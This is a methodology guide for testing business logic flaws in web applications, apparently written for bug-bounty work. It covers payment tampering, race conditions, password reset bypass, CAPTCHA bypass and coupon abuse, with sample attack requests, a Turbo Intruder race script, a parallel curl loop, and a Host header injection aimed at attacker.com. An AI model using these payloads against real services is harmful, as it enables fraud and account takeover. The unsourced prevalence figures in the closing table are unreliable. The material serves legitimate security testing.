# Business Logic Flaw Patterns

Common business logic vulnerability patterns derived from real-world bug bounty reports. These flaws bypass security controls through abuse of legitimate application functionality.

---

## Root Cause Categories

### 1. Payment/Transaction Tampering

**Root Cause:** The application trusts client-side values for financial operations (amount, quantity, price, currency) without server-side validation. The server uses client-submitted values directly rather than server-defined prices.

**Detection Strategy:**
1. Intercept payment requests and modify amount, quantity, and currency fields
2. Test negative values: `"amount": -100`, `"quantity": -1`
3. Test zero values: `"amount": 0`
4. Test fractional manipulation: set price to `0.01` or `0.001`
5. Modify currency codes to manipulate exchange rates
6. Remove signature or hash parameters to test for missing validation

### 2. Race Conditions in Financial Operations

**Root Cause:** Multiple operations on a shared resource (coupon redemption, withdrawal, transfer) are not properly serialized, allowing an attacker to exploit TOCTOU (time-of-check time-of-use) windows.

**Detection Strategy:**
1. Identify operations that modify balances, redeem codes, or claim limited resources
2. Send 20-100 concurrent simultaneous requests to the same endpoint
3. Check if the system processes multiple requests before the balance/deduction check
4. Common candidates: coupon/promo code redemption, account withdrawal, contest entries, limited inventory items

### 3. Password Reset Logic Bypass

**Root Cause:** The password reset flow allows skipping steps (e.g., bypassing OTP verification), directly accessing the password set URL, or manipulating parameters to reset another user's password.

**Detection Strategy:**
1. Complete the first step of password reset (request reset), then directly navigate to the password set URL
2. Intercept responses and modify status codes/JSON bodies
3. Try different HTTP methods on password set endpoints
4. Check if the reset token is tied to the user session or reusable

### 4. CAPTCHA / Rate Limit Bypass

**Root Cause:** CAPTCHA validation can be bypassed by reusing the same token, removing the CAPTCHA parameter, changing request methods, or rotating client-side identifiers.

**Detection Strategy:**
1. Solve CAPTCHA once, then reuse the same token for multiple submissions
2. Remove the CAPTCHA field entirely from the request
3. Change Content-Type from JSON to form-encoded or vice versa
4. Rotate IP via X-Forwarded-For headers
5. Check if CAPTCHA is validated server-side or only client-side

---

## Common Attack Vectors

### Payment Flow Manipulation

```http
-- Amount tampering
POST /api/checkout HTTP/1.1
{"price": 0.01, "product_id": 1001, "quantity": 1}

-- Negative quantity abuse
POST /api/cart/update HTTP/1.1
{"product_id": 1001, "quantity": -1}
# Cart total may decrease instead of increase

-- Currency manipulation
POST /api/convert HTTP/1.1
{"from": "USD", "to": "BTC", "amount": 1000000}
# Check if conversion rate is favorable

-- Fee bypass
POST /api/transfer HTTP/1.1
{"amount": 1000, "fee": 0}
```

### Race Condition Testing

```bash
# Burp Turbo Intruder - race.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=10,
                           pipeline=False)

    for i in range(50):
        engine.queue(target.req, i)

    engine.start(timeout=5)

def handleResponse(req, interesting):
    table.add(req)

# Or using curl in parallel:
for i in {1..50}; do
    curl -s -X POST -d "code=DISCOUNT50" http://target/redeem &
done
wait

# Check how many times the code was redeemed
```

### Password Reset Flow Abuse

```http
-- Step-skip by directly accessing set-password
POST /api/reset/send-code HTTP/1.1
{"email": "victim@example.com"}

-- Directly navigate to set password (skip code verification)
POST /api/reset/set-password HTTP/1.1
{"token": "000000", "password": "hacked123"}

-- Host header injection in reset email
POST /api/forgot HTTP/1.1
Host: attacker.com
{"email": "victim@example.com"}
# Reset link sent to victim contains attacker.com as domain

-- IDOR on password reset
POST /api/admin/reset-user HTTP/1.1
{"user_id": 1002, "new_password": "hacked123"}
```

### Coupon / Promo Code Abuse

```http
-- Reuse single-use coupon
POST /api/redeem HTTP/1.1
{"code": "WELCOME10"}
# Use same code multiple times

-- Stack coupons
POST /api/cart/apply-coupon HTTP/1.1
{"code": "10OFF"}
then
POST /api/cart/apply-coupon HTTP/1.1
{"code": "20OFF"}
# Check if multiple coupons stack

-- Parameter manipulation
POST /api/redeem HTTP/1.1
{"code": "FREESHIPPING", "user": "attacker", "max_uses": 9999}
```

---

## Detection Methodology

### Financial Logic Testing

```yaml
test_parameters:
  amount:
    - "0.00"
    - "0.01"
    - "-1.00"
    - "-0.01"
    - "999999999.99"
    - "1e10"
    - "null"
    - "NaN"
  quantity:
    - "0"
    - "-1"
    - "9999"
  currency:
    - "invalid"
    - "" (empty)
    - "BTC"
    - different from expected
  fee:
    - "0"
    - "-1"
    - "null"
```

### Multi-Step Flow Testing

```yaml
test_actions:
  - "Execute steps in different order"
  - "Skip intermediate steps"
  - "Replay earlier steps"
  - "Execute steps concurrently"
  - "Use stale tokens from previous flows"
  - "Modify step parameters mid-flow"
  - "Change HTTP method between steps"
```

---

## Real-World Case References

| Report | Vulnerability | Technique | Impact |
|--------|---------------|-----------|--------|
| Banking industry | Payment amount tampering | Modify amount in POST body | 83% prevalence |
| Banking industry | Password reset bypass | Skip OTP verification step | 88% prevalence |
| Banking industry | Race condition | Concurrent withdrawal/coupon redemption | 45% success rate |
| General | CAPTCHA bypass | Token reuse | Multiple platforms |
| General | Coupon abuse | Stacking discount codes | Multiple platforms |
